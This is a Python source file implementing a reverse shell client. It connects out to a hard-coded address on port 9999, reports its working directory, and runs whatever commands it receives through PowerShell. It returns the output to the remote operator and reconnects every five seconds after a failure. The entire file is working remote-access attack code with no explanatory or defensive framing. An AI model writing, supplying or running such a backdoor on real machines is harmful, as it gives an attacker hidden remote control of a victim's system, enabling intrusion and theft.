import socket
import subprocess
import os
import time


def execute_command(command):
    try:
        # Use PowerShell for command execution
        command = f"powershell.exe {command}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return f"Command execution failed: {str(e)}\n"


def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(
                ("192.168.127.68", 9999)
            ) 
            print("Connected to server")

            while True:
                cwd = os.getcwd()
                client.sendall(cwd.encode("utf-8"))

                command = client.recv(1024).decode("utf-8")
                print(f"Received command: {command}")
                if command.lower() == "exit":
                    break

                if command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        response = f"Changed directory to {os.getcwd()}\n"
                    except Exception as e:
                        response = f"Error changing directory: {str(e)}\n"
                else:
                    response = execute_command(command)

                if not response:
                    response = "Command executed but no output returned.\n"
                print(f"Sending response: {response}")

                client.sendall(response.encode("utf-8"))

            client.close()
            break
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(5)


if __name__ == "__main__":
    connect_to_server()
